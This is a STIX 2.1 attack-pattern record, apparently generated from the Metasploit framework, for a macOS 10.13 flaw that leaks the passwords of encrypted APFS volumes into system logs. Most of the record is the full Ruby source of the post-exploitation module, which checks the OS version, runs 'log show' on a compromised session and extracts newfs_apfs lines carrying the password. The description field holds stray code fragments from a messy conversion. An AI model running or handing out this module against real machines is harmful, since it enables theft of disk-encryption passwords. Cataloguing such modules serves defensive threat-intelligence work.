{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--edbad43d-0750-4ee7-b1a4-080943a14d09",
    "created": "2024-08-14T16:33:00.698327Z",
    "modified": "2024-08-14T16:33:00.698331Z",
    "name": "Mac OS X APFS Encrypted Volume Password Disclosure",
    "description": " This module exploits a flaw in OSX 10.13 through 10.13.3 that discloses the passwords of encrypted APFS volumes.  In OSX a normal user can use the 'log' command to view the system logs. In OSX 10.13 to 10.13.2 when a user creates an encrypted APFS volume the password is visible in plaintext within these logs.  'License' => MSF_LICENSE 'References' => [",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/osx/gather/apfs_encrypted_volume_passwd.rb",
            "external_id": "apfs_encrypted_volume_passwd.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.mac4n6.com/blog/2018/3/21/uh-oh-unified-logs-in-high-sierra-1013-show-plaintext-password-for-apfs-encrypted-external-volumes-via-disk-utilityapp"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Mac OS X APFS Encrypted Volume Password Disclosure',\n        'Description' => %q{\n          This module exploits a flaw in OSX 10.13 through 10.13.3\n          that discloses the passwords of encrypted APFS volumes.\n\n          In OSX a normal user can use the 'log' command to view the system\n          logs. In OSX 10.13 to 10.13.2 when a user creates an encrypted APFS\n          volume the password is visible in plaintext within these logs.\n        },\n        'License' => MSF_LICENSE,\n        'References' => [\n          [ 'URL', 'https://thehackernews.com/2018/03/macos-apfs-password.html' ],\n          [ 'URL', 'https://www.mac4n6.com/blog/2018/3/21/uh-oh-unified-logs-in-high-sierra-1013-show-plaintext-password-for-apfs-encrypted-external-volumes-via-disk-utilityapp' ]\n        ],\n        'Platform' => 'osx',\n        'Arch' => ARCH_ALL,\n        'Author' => [\n          'Sarah Edwards',  # earliest public discovery\n          'cbrnrd'          # Metasploit module\n        ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'DisclosureDate' => '2018-03-21'\n      )\n    )\n    register_options([\n      # The command doesn't give volume names, only mount paths (current or previous)\n      OptString.new('MOUNT_PATH', [false, 'The mount path of the volume to get the password of (Leave blank for all)', ''])\n    ])\n  end\n\n  def check\n    osx_version = cmd_exec('sw_vers -productVersion')\n    return Exploit::CheckCode::Vulnerable if osx_version =~ /^10\\.13[.[0-3]]?$/\n\n    Exploit::CheckCode::Safe\n  end\n\n  def run\n    if check == Exploit::CheckCode::Safe\n      print_error 'This version of OSX is not vulnerable'\n      return\n    end\n    cmd = \"log show --info --predicate 'eventMessage contains \\\"newfs_\\\"'\"\n    cmd << \" | grep #{datastore['MOUNT_PATH']}\" unless datastore['MOUNT_PATH'].empty?\n    vprint_status \"Running \\\"#{cmd}\\\" on target...\"\n    results = cmd_exec(cmd)\n    vprint_status \"Target results:\\n#{results}\"\n    if results.empty?\n      print_error 'Got no response from target. Stopping...'\n    else\n      successful_lines = 0\n      results.lines.each do |l|\n        next unless l =~ /newfs_apfs(.*)-S(.*)$/\n\n        print_good \"APFS command found: #{::Regexp.last_match(0)}\"\n        successful_lines += 1\n      end\n      print_error 'No password(s) found for any volumes. Exiting...' if successful_lines.zero?\n    end\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2018-03-21",
    "x_mitre_platforms": [
        "osx'"
    ]
}